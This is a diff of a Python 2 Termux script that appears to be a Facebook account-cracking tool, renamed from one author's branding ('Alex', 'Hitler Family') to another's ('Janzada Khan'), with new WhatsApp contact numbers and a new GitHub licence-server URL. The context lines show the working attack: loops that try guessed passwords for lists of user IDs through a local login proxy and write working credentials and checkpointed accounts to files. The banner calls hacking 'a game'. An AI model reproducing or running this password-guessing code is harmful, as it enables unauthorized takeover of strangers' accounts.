@@ -15,8 +15,8 @@ import cookielib
 import uuid
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
-__author__ = 'Mr.James'
-__copyright = 'All rights reserved . Copyright  Mr.James'
+__author__ = 'Mr.Jam'
+__copyright = 'All rights reserved . Copyright  Mr.Jam'
 os.system('termux-setup-storage')
 os.system('pkg install nodejs')
 
@@ -39,17 +39,17 @@ header = {
 os.system('git pull')
 os.system('clear')
 logo = """
-\033[1;94  _____   _       ______  _     _ 
-\033[1;94 (_____) (_)     (______)( )   ( )
-\033[1;94(_)___(_)(_)     (_)__    (_)_(_) 
-\033[1;94(_______)(_)     (____)    (___)  
-\033[1;94(_)   (_)(_)____ (_)____  (_) (_) 
-\033[1;94(_)   (_)(______)(______)(_)   (_)
+\033[1;94m   ___  ___   _   _  ______  ___ ______  ___  
+\033[1;94m  |_  |/ _ \ | \ | ||___  / / _ \|  _  \/ _ \ 
+\033[1;93m    | / /_\ \|  \| |   / / / /_\ \ | | / /_\ \
+\033[1;91m    | |  _  || . ` |  / /  |  _  | | | |  _  |
+\033[1;97m/\__/ / | | || |\  |./ /___| | | | |/ /| | | |
+\033[1;92m\____/\_| |_/\_| \_/\_____/\_| |_/___/ \_| |_/
 \033[1;97m═══════════════════════════════════════════
-\033[1;90m➣ HACKING IS NOT A CRIME IT’S A GAME 
-\033[1;90m➣ AUTHOR :\033[1;92m Alex Prince x Xtylo Ali
-\033[1;90m➣ FROM :\033[1;92m Hitler Family 
-\033[1;90m➣ WARNING :\033[1;92m DON'T COPY MY SCRIPT 
+\033[1;94m➣ HACKING IS NOT A CRIME IT’S A GAME 
+\033[1;94m➣ AUTHOR  :\033[1;92m Janzada Khan
+\033[1;94m➣ WHATSAPP:\033[1;92m +923099006070 
+\033[1;94m➣ WARNING :\033[1;92m DON'T COPY MY SCRIPT 
 \033[1;97m═══════════════════════════════════════════ """ 
 
 def reg():
@@ -64,7 +64,7 @@ def reg():
         to = open('/sdcard/.hst.txt', 'r').read()
     except (KeyError, IOError):
         reg2()
-    r = requests.get('https://raw.githubusercontent.com/hitler-family/alex/main/server.txt').text
+    r = requests.get('https://raw.githubusercontent.com/janzada/khan/main/server.txt').text
     if to in r:
         os.system("cd ..... && npm install")
         os.system("fuser -k 5000/tcp &")
@@ -85,7 +85,7 @@ def reg():
         print ' \033[1;92mYour id: ' + to
         print ''
         raw_input('\033[1;93m Press enter to send id')
-        os.system('xdg-open https://wa.me/+923126606895')
+        os.system('xdg-open https://wa.me/+923099006070')
         reg()
 
 
@@ -102,7 +102,7 @@ def reg2():
     print ''
     print ''
     raw_input(' Press enter to go to whatsapp ')
-    os.system('xdg-open https://wa.me/+923126606895')
+    os.system('xdg-open https://wa.me/+923099006070')
     sav = open('/sdcard/.hst.txt', 'w')
     sav.write(id)
     sav.close()
@@ -335,7 +335,7 @@ def menu_s():
         choice_crack()
     elif ms == '3':
         os.system("clear")
-	os.system('python2 .shahrukh.py')
+	os.system('python2 .ok.py')
     elif ms == '4':
         lout()
     elif ms == '5':
@@ -491,13 +491,13 @@ def a_s():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\033[1;92m[Alex-Ok] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print '\033[1;92m[Janzada-Ok] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                 ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\033[1;31;1m[Alex-Cp] ' + uid + ' | ' + pass1
+                print '\033[1;96m[Janzada-Cp] ' + uid + ' | ' + pass1
                 cp = open('HOP_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
@@ -507,13 +507,13 @@ def a_s():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\033[1;92m[Alex-Ok] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print '\033[1;92m[Janzada-Ok] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                     ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\033[1;31;1m[Alex-Cp] ' + uid + ' | ' + pass2
+                    print '\033[1;96m[Janzada-Cp] ' + uid + ' | ' + pass2
                     cp = open('HOP_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
@@ -523,13 +523,13 @@ def a_s():
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                     q = json.loads(data)
                     if 'loc' in q:
-                        print '\033[1;92m[Alex-Ok] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print '\033[1;92m[Janzada-Ok] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                         ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
-                        print '\033[1;31;1m[Alex-Cp] ' + uid + ' | ' + pass3
+                        print '\033[1;96m[Janzada-Cp] ' + uid + ' | ' + pass3
                         cp = open('HOP_CP.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
@@ -693,13 +693,13 @@ def c_s():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\033[1;92m[Alex-Ok] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print '\033[1;92m[Janzada-Ok] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                 ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\033[1;31;1m[Alex-Cp] ' + uid + ' | ' + pass1
+                print '\033[1;96m[Janzada-Cp] ' + uid + ' | ' + pass1
                 cp = open('HOP_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
@@ -708,13 +708,13 @@ def c_s():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\033[1;92m[Alex-Ok] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print '\033[1;92m[Janzada-Ok] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                     ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\033[1;31;1m[Alex-Cp] ' + uid + ' | ' + pass2
+                    print '\033[1;96m[Janzada-Cp] ' + uid + ' | ' + pass2
                     cp = open('HOP_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
@@ -723,13 +723,13 @@ def c_s():
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                     q = json.loads(data)
                     if 'loc' in q:
-                        print '\033[1;92m[Alex-Ok] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print '\033[1;92m[Janzada-Ok] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                         ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
-                        print '\033[1;31;1m[Alex-Cp] ' + uid + ' | ' + pass3
+                        print '\033[1;96m[Janzada-Cp] ' + uid + ' | ' + pass3
                         cp = open('HOP_CP.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
